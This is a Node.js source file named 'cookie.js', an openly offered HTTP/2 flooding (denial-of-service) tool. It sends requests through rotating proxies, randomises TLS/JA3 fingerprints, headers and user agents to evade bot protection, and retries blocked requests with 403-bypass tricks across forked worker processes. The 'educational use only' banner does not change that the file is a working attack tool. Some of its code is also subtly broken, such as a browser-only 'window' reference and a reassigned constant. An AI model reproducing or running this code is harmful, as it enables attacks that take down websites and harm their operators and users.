/*

    Method By STEVEN•STORE🕊🪽

    COOKIE.JS

    Version: 2.5.0
    Node: v18.16.1
    OS: Ubuntu 22.04

    1.0 INITIAL RELEASE:
    - Basic HTTP/2 flooding
    - Simple proxy support
    - Basic TLS config

    2.0 MAJOR UPDATE:
    - Enhanced TLS fingerprinting
    - Advanced JA3 signature
    - Improved proxy rotation
    - Adaptive rate limiting

    2.1 PERFORMANCE:
    - Optimized cluster management
    - Improved error handling
    - Enhanced cookie management

    2.5 CURRENT:
    - changed cookie management with something more complex
    - Advanced TLS socket Prevents predictable TLS version usage
    - Improved stealth techniques

    NEXT VERSIONS:
    - IPv6 support
    - socks4/5 support 

    WARNING: 
    Educational use only. 
    Unauthorized usage prohibited.
*/

const crypto = require("crypto");
const fs = require('fs');
const url = require('url');
const cluster = require('cluster');
const http2 = require('http2');
const http = require('http');
const tls = require('tls');
const colors = require('colors');

let statusStats = {};
const workers = {};
let ratelimit = [];
let proxies = [];

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
process.on("SIGHUP", () => 1);
process.on("SIGCHLD", () => 1);
require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    defaultCiphers.slice(3)
].join(":");

if (process.argv.length < 7) {
    console.log(`
======================================================
                 COOKIE.JS - USAGE
======================================================
Usage:
  node cookie.js [url] [time] [threads] [rate] [proxy]

Options:
  --debug [true/false]       Enable advanced debugging
  --redirect [true/false]    Enable redirect system
  --ratelimit [true/false]   Enable ratelimit system
  --query [true/false]       Enable random queries
  --end [number]             Stop after sending a specific number of requests
  --stealth [true/false]     Mimic legitimate browser behavior
  --adaptive [true/false]    Dynamically adjust strategy

======================================================
`);
    process.exit(0);
}

const target = process.argv[2];
const duration = parseInt(process.argv[3]) || 60;
const threads = parseInt(process.argv[4]) || 10;
const rate = parseInt(process.argv[5]) || 64;
const proxyfile = process.argv[6] || 'proxies.txt';
const parsed = url.parse(target);

function loadProxies() {
    if (proxies.length === 0) {
        const data = fs.readFileSync(proxyfile, 'utf-8');
        proxies = data.toString().replace(/\r/g, '').split('\n').filter(Boolean);
    }
    return proxies;
}

function get_option(flag) {
    const index = process.argv.indexOf(flag);
    return index !== -1 && index + 1 < process.argv.length ? process.argv[index + 1] : undefined;
}

const options = {
    debug: get_option('--debug') === 'true',
    redirect: get_option('--redirect') === 'true',
    ratelimit: get_option('--ratelimit') === 'true',
    query: get_option('--query') === 'true',
    end: parseInt(get_option('--end')) || null,
    stealth: get_option('--stealth') === 'true',
    adaptive: get_option('--adaptive') === 'true'
};

const langHeader = [
    'en-US,en;q=0.9',
    'en-GB,en;q=0.9',
    "en-US,en;q=0.5"
];

const encodingHeader = [
    'gzip, deflate, br, zstd',
    'gzip, deflate, br',
    'gzip, deflate'
];

const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
];

function randomUA() {
    return userAgents[Math.floor(Math.random() * userAgents.length)];
}

function createTLSSocket(parsed, socket) {
    // Advanced TLS version selection
    const tlsVersions = ['TLSv1.3', 'TLSv1.2'];
    const selectedVersion = tlsVersions[Math.floor(Math.random() * tlsVersions.length)];

    // Enhanced cipher suite configuration
    const cipherSuites = [
        'TLS_AES_256_GCM_SHA384',
        'TLS_CHACHA20_POLY1305_SHA256',
        'TLS_AES_128_GCM_SHA256',
        'ECDHE-RSA-AES256-GCM-SHA384',
        'ECDHE-RSA-AES128-GCM-SHA256',
        'ECDHE-ECDSA-AES256-GCM-SHA384',
        'ECDHE-ECDSA-AES128-GCM-SHA256'
    ].join(':');

    // Sophisticated elliptic curve selection
    const ellipticCurves = [
        'X25519', 
        'P-256', 
        'P-384', 
        'secp521r1'
    ].join(':');

    // Advanced signature algorithms
    const signatureAlgorithms = [
        'ecdsa_secp256r1_sha256',
        'ecdsa_secp384r1_sha384',
        'rsa_pss_rsae_sha256',
        'rsa_pss_rsae_sha384',
        'rsa_pkcs1_sha256'
    ].join(':');

    // Secure TLS options
    const secureOptions = 
        crypto.constants.SSL_OP_NO_SSLv2 | 
        crypto.constants.SSL_OP_NO_SSLv3 | 
        crypto.constants.SSL_OP_NO_TLSv1 | 
        crypto.constants.SSL_OP_NO_TLSv1_1 |
        crypto.constants.SSL_OP_NO_COMPRESSION |
        crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE;

    // Dynamic JA3 fingerprint generation
    const ja3Fingerprint = generateJA3Fingerprint();

    return tls.connect({
        host: parsed.host,
        servername: parsed.host,
        
        // Enhanced security configurations
        ciphers: cipherSuites,
        sigalgs: signatureAlgorithms,
        curves: ellipticCurves,

        // TLS version control
        minVersion: selectedVersion,
        maxVersion: 'TLSv1.3',

        // Advanced protocol negotiation
        ALPNProtocols: ['h2', 'http/1.1', 'http/1.0'],

        // Socket and connection parameters
        socket: socket,
        secure: true,
        requestCert: true,
        rejectUnauthorized: false,

        // Enhanced security options
        secureOptions: secureOptions,

        // Session and performance optimization
        sessionTimeout: 0,
        honorCipherOrder: true,

        // Custom extensions and metadata
        extensions: {
            ...ja3Fingerprint,
            clientHelloVersion: selectedVersion
        }
    });
}

// JA3 Fingerprint Generation
function generateJA3Fingerprint() {
    const components = {
        sslVersions: ['771', '770', '769'],
        cipherSuites: [
            '4865', '4866', '4867', 
            '49195', '49199', 
            '49171', '49172'
        ],
        extensions: [
            '0', '11', '10', 
            '35', '16', '23', 
            '65281', '43'
        ],
        ellipticCurves: [
            '29', '23', '24', 
            '256', '257'
        ],
        ellipticCurveFormats: ['0', '1']
    };

    const randomSelect = (arr, min, max) => 
        shuffle(arr).slice(0, min + Math.floor(Math.random() * (max - min + 1)));

    return {
        ja3: {
            version: components.sslVersions[0],
            ciphers: randomSelect(components.cipherSuites, 3, 5).join('-'),
            extensions: randomSelect(components.extensions, 4, 7).join('-'),
            curves: randomSelect(components.ellipticCurves, 2, 4).join('-'),
            formats: randomSelect(components.ellipticCurveFormats, 1, 2).join('-')
        },
        fingerprint: crypto.randomBytes(16).toString('hex')
    };
}

// Utility shuffle function
function shuffle(array) {
    return array.sort(() => Math.random() - 0.5);
}

function randomQueryParams() {
    const paramTypes = {
        search: ['q', 'query', 'search', 'keyword'],
        pagination: ['page', 'limit', 'offset', 'start'],
        sorting: ['sort', 'order', 'direction'],
        filtering: ['filter', 'category', 'type', 'status']
    };

    const params = [];
    const paramCount = Math.floor(Math.random() * 5) + 1;

    for (let i = 0; i < paramCount; i++) {
        const typeKeys = Object.keys(paramTypes);
        const randomType = paramTypes[typeKeys[Math.floor(Math.random() * typeKeys.length)]];
        const key = randomType[Math.floor(Math.random() * randomType.length)];
        
        const valueGenerators = {
            string: () => randomString(5, 10),
            number: () => Math.floor(Math.random() * 1000),
            boolean: () => Math.random() > 0.5,
            complex: () => {
                const complexTypes = ['uuid', 'timestamp', 'base64'];
                const type = complexTypes[Math.floor(Math.random() * complexTypes.length)];
                
                switch(type) {
                    case 'uuid':
                        return crypto.randomUUID();
                    case 'timestamp':
                        return Date.now();
                    case 'base64':
                        return crypto.randomBytes(8).toString('base64');
                }
            }
        };

        const valueType = Object.keys(valueGenerators)[Math.floor(Math.random() * Object.keys(valueGenerators).length)];
        const value = valueGenerators[valueType]();

        params.push(`${key}=${encodeURIComponent(value)}`);
    }

    return params.join('&');
}

function randomHeaders() {
    const headerCategories = {
        tracking: [
            'X-Forwarded-For',
            'X-Requested-With',
            'X-Correlation-ID',
            'X-Trace-ID'
        ],
        custom: [
            'X-Custom-Header',
            'X-Application-Key',
            'X-Client-ID',
            'X-Session-Token'
        ],
        performance: [
            'X-Response-Time',
            'X-Cache-Control',
            'X-Rate-Limit-Remaining',
            'X-Proxy-ID'
        ],
        security: [
            'X-Security-Token',
            'X-Origin-IP',
            'X-Authenticated-User',
            'X-Access-Level'
        ]
    };

    const headers = {};
    const headerCount = Math.floor(Math.random() * 4) + 2;

    for (let i = 0; i < headerCount; i++) {
        const categoryKeys = Object.keys(headerCategories);
        const randomCategory = headerCategories[categoryKeys[Math.floor(Math.random() * categoryKeys.length)]];
        
        const headerKey = randomCategory[Math.floor(Math.random() * randomCategory.length)];
        
        const valueGenerators = {
            ipv4: () => `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`,
            token: () => crypto.randomBytes(16).toString('hex'),
            timestamp: () => new Date().toISOString(),
            randomString: () => randomString(10, 20),
            uuid: () => crypto.randomUUID()
        };

        const valueType = Object.keys(valueGenerators)[Math.floor(Math.random() * Object.keys(valueGenerators).length)];
        const headerValue = valueGenerators[valueType]();

        headers[headerKey] = headerValue;
    }

    return headers;
}

// Utility function for random string generation
function randomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    return Array.from(
        crypto.randomBytes(length), 
        x => characters[x % characters.length]
    ).join('');
}

class CookieJar {
    constructor() {
        this.cookies = new Map();
        this.cookieMetadata = new Map();
    }

    setCookie(cookieString, domain) {
        const cookies = cookieString.split(';').map(cookie => cookie.trim());
        const now = Date.now();

        cookies.forEach(cookie => {
            const [nameValue, ...attributes] = cookie.split(';');
            const [name, value] = nameValue.split('=');
            const key = `${domain}:${name.trim()}`;

            // Parse cookie attributes
            const parsedAttributes = this._parseCookieAttributes(attributes);

            // Store cookie with metadata
            this.cookies.set(key, value.trim());
            this.cookieMetadata.set(key, {
                domain: domain,
                path: parsedAttributes.path || '/',
                expires: parsedAttributes.expires ? new Date(parsedAttributes.expires).getTime() : null,
                httpOnly: parsedAttributes.httpOnly || false,
                secure: parsedAttributes.secure || false,
                sameSite: parsedAttributes.sameSite || 'Lax',
                created: now
            });
        });

        // Cleanup expired cookies
        this._cleanupExpiredCookies();
    }

    getCookieHeader(domain) {
        const now = Date.now();
        const validCookies = [];

        for (const [key, value] of this.cookies.entries()) {
            if (key.startsWith(`${domain}:`)) {
                const metadata = this.cookieMetadata.get(key);
                
                // Check cookie validity
                if (metadata && 
                    (!metadata.expires || metadata.expires > now) &&
                    (!metadata.secure || window.location.protocol === 'https:')) {
                    validCookies.push(`${key.split(':')[1]}=${value}`);
                }
            }
        }

        return validCookies.join('; ');
    }

    _parseCookieAttributes(attributes) {
        const parsedAttributes = {};

        attributes.forEach(attr => {
            const [name, value] = attr.trim().split('=');
            switch (name.toLowerCase()) {
                case 'expires':
                    parsedAttributes.expires = value;
                    break;
                case 'path':
                    parsedAttributes.path = value;
                    break;
                case 'domain':
                    parsedAttributes.domain = value;
                    break;
                case 'httponly':
                    parsedAttributes.httpOnly = true;
                    break;
                case 'secure':
                    parsedAttributes.secure = true;
                    break;
                case 'samesite':
                    parsedAttributes.sameSite = value;
                    break;
            }
        });

        return parsedAttributes;
    }

    _cleanupExpiredCookies() {
        const now = Date.now();
        
        for (const [key, metadata] of this.cookieMetadata.entries()) {
            if (metadata.expires && metadata.expires < now) {
                this.cookies.delete(key);
                this.cookieMetadata.delete(key);
            }
        }
    }

    // Advanced cookie management methods
    clearCookies(domain) {
        for (const key of this.cookies.keys()) {
            if (key.startsWith(`${domain}:`)) {
                this.cookies.delete(key);
                this.cookieMetadata.delete(key);
            }
        }
    }

    getCookieCount(domain) {
        return Array.from(this.cookies.keys())
            .filter(key => key.startsWith(`${domain}:`))
            .length;
    }
}

const cookieJar = new CookieJar();

function debugRedirect(info) {
    if (options.redirect) {
        console.log(`[Redirect Debug] ${new Date().toISOString()} - ${info}`);
    }
}

function debugAdaptive(status) {
    if (options.debug && options.adaptive) {
        console.log(`[Adaptive Debug] ${new Date().toISOString()} - Status: ${status}, Rate: ${rate}`);
    }
}

function debugStealth(delay) {
    if (options.debug && options.stealth) {
        console.log(`[Stealth Debug] ${new Date().toISOString()} - Delay: ${delay}ms`);
    }
}

let requestCount = 0;

async function attack() {
    if (options.end && requestCount >= options.end) {
        console.log("Reached the specified number of requests. Stopping.");
        process.exit(0);
    }

    const currentTime = Date.now();
    ratelimit = ratelimit.filter(limit => currentTime - limit.timestamp <= 60000);

    let proxy;
    do {
        proxy = proxies[Math.floor(Math.random() * proxies.length)].split(':');
    } while (ratelimit.some(limit => limit.proxy === proxy[0] && (Date.now() - limit.timestamp) < 60000));

    const agent = new http.Agent({
        keepAlive: true,
        maxFreeSockets: Infinity,
        keepAliveMsecs: Infinity,
        maxSockets: Infinity,
        maxTotalSockets: Infinity
    });

    http.request({
        host: proxy[0],
        agent: agent,
        port: proxy[1],
        headers: {
            'Host': parsed.host,
            'Proxy-Connection': 'Keep-Alive',
            'Connection': 'Keep-Alive',
        },
        method: 'CONNECT',
        path: parsed.host,
    }).on("connect", async (res, socket) => {
        if (res.statusCode === 200) {
            const ua = randomUA();
            const randomParams = randomQueryParams();
            const additionalHeaders = randomHeaders();

            let headers = {
                ":method": "GET",
                ":path": options.query ? (parsed.pathname + '?=' + randomParams) : parsed.pathname,
                ":authority": parsed.host,
                ":scheme": "https",
                "User-Agent": randomUA(),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Encoding": "deflate, gzip, br",
                "Accept-Language": "en-US,en;q=0.5",
                "Referer": `https://${parsed.host}`,
                "Origin": `https://${parsed.host}`,
                "X-Requested-With": "XMLHttpRequest",
                "Cookie": cookieJar.getCookieHeader(parsed.host),
                ...additionalHeaders
            };

            // Enhanced 403 bypass techniques
            const bypass403Techniques = [
                () => {
                    // Modify path to potentially bypass restrictions
                    headers[":path"] = headers[":path"].replace(/^\//, '/index.php?');
                },
                () => {
                    // Add random query parameter
                    headers[":path"] += `&_=${Date.now()}`;
                },
                () => {
                    // Rotate User-Agent more aggressively
                    headers["User-Agent"] = randomUA();
                },
                () => {
                    // Add additional headers to mimic browser behavior
                    headers["sec-ch-ua"] = `"Chromium";v="${Math.floor(Math.random() * 20) + 100}", "Google Chrome";v="${Math.floor(Math.random() * 20) + 100}"`;
                    headers["sec-ch-ua-mobile"] = "?0";
                    headers["sec-ch-ua-platform"] = "Windows";
                }
            ];

            socket.setKeepAlive(true, 100000);
            const tlsSocket = createTLSSocket(parsed, socket);

            tlsSocket.on('secureConnect', async () => {
                headers["ja3"] = ja3();
            });

            tlsSocket.on('error', () => {});

            const client = http2.connect(parsed.href, {
                createConnection: () => tlsSocket,
                initialWindowSize: 33554432,
                settings: {
                    headerTableSize: 65536,
                    maxConcurrentStreams: 100,
                    initialWindowSize: 33554432,
                    maxHeaderListSize: 262144,
                    enablePush: false,
                },
            }, async () => {
                function request(retryCount = 0) {
                    if (client.destroyed) return;

                    // 403 bypass rotation
                    if (retryCount > 0 && retryCount <= bypass403Techniques.length) {
                        bypass403Techniques[retryCount - 1]();
                    }

                    const req = client.request(headers);

                    req.on("response", (res) => {
                        const status = res[':status'];

                        if (!statusStats[status]) statusStats[status] = 0;
                        statusStats[status]++;

                        // Enhanced 403 handling
                        if ((status === 403 || status === 429) && options.ratelimit) {
                            ratelimit.push({ 
                                proxy: proxy, 
                                timestamp: Date.now(),
                                status: status
                            });

                            if (!statusStats['BLOCK']) statusStats['BLOCK']++;

                            // Aggressive retry mechanism
                            if (retryCount < bypass403Techniques.length) {
                                setTimeout(() => request(retryCount + 1), Math.pow(2, retryCount) * 1000);
                            }

                            client.destroy();
                            return;
                        }

                        if (res['set-cookie']) {
                            cookieJar.setCookie(res['set-cookie'].join('; '), parsed.host);
                        }

                        if (options.redirect && (status >= 300 && status < 400) && res['location']) {
                            const newLocation = url.resolve(parsed.href, res['location']);
                            const newParsed = url.parse(newLocation);

                            headers[":path"] = newParsed.path;
                            headers[":authority"] = newParsed.host;

                            request();
                        } else {
                            req.close();
                        }

                        if (options.adaptive) {
                            if (status === 200) {
                                rate = Math.min(rate + 1, 100);
                            } else if (status >= 400) {
                                rate = Math.max(rate - 1, 1);
                            }
                        }
                    }).on('error', () => {
                        if (!statusStats['CLOSE']) statusStats['CLOSE']++;

                        if (retryCount < 3) {
                            setTimeout(() => request(retryCount + 1), Math.pow(2, retryCount) * 1000);
                        }
                    }).end();

                    requestCount++;

                    setTimeout(() => {
                        request();
                    }, 1000 / rate);
                }

                if (options.stealth) {
                    const delay = Math.random() * 1000;
                    setTimeout(() => request(), delay);
                } else {
                    request();
                }
            }).on('error', (err) => {
                if (err.code === "ERR_HTTP2_GOAWAY_SESSION" || err.code === "ECONNRESET") {
                    client.destroy();
                }
            });
        }
    }).on("error", () => {}).end();
}

if (cluster.isMaster) {
    const workers = new Map();
    process.stdin.resume();

    console.log(`
             *     ,MMM8&&&.            *
                  MMMM88&&&&&    .
                 MMMM88&&&&&&&
     *           MMM88&&&&&&&&
                 MMM88&&&&&&&&
                 'MMM88&&&&&&'
                   'MMM8&&&'      *    
          |\\___/|     
          )     (             .              '
         =\\     /=
           )===(       *
          /     \\
          |     |
         /       \\
         \\       /
  _/\\_/\\_/\\__  _/_/\\_/\\_/\\_/\\_/\\_/\\_/\\_/\\_
    `);

    console.log(`
     Method    : [COOKIE]                     
     Target    : [${target}]                  
     Duration  : [${duration}]                
     Threads   : [${threads}]                 
     Rate      : [${rate}]                   
     Proxy     : [${proxyfile}]               
    `);

    // Initialize worker threads
    for (let i = 0; i < threads; i++) {
        const worker = cluster.fork();
        workers.set(worker.id, {
            instance: worker,
            stats: {},
            startTime: Date.now()
        });
    }

    // Handle worker messages
    cluster.on('message', (worker, message) => {
        const workerData = workers.get(worker.id);
        if (workerData) {
            workerData.stats = message;
        }
    });

    // Handle worker exit
    cluster.on('exit', (worker, code, signal) => {
        if (signal !== 'SIGTERM') {
            const newWorker = cluster.fork();
            workers.set(newWorker.id, {
                instance: newWorker,
                stats: {},
                startTime: Date.now()
            });
        }
    });

    // Debug logging
    if (options.debug) {
        setInterval(() => {
            let totalStats = {};
            for (const [workerId, workerData] of workers) {
                const stats = workerData.stats;
                Object.keys(stats).forEach(status => {
                    totalStats[status] = (totalStats[status] || 0) + stats[status];
                });
            }
            console.log(new Date().toLocaleString(), totalStats);
        }, 1000);
    }

    // Attack duration control
    setTimeout(() => {
        console.log('\n[!] Attack completed');
        process.exit(0);
    }, duration * 1000);

} else {
    // Worker process
    loadProxies();
    
    const attackInterval = setInterval(() => {
        for (let i = 0; i < rate; i++) {
            attack();
        }
    }, 1000);

    // Debug reporting
    if (options.debug) {
        setInterval(() => {
            if (process.connected) {
                process.send(statusStats);
            }
        }, 250);
    }

    // Worker cleanup
    setTimeout(() => {
        clearInterval(attackInterval);
        process.exit(0);
    }, duration * 1000);
}
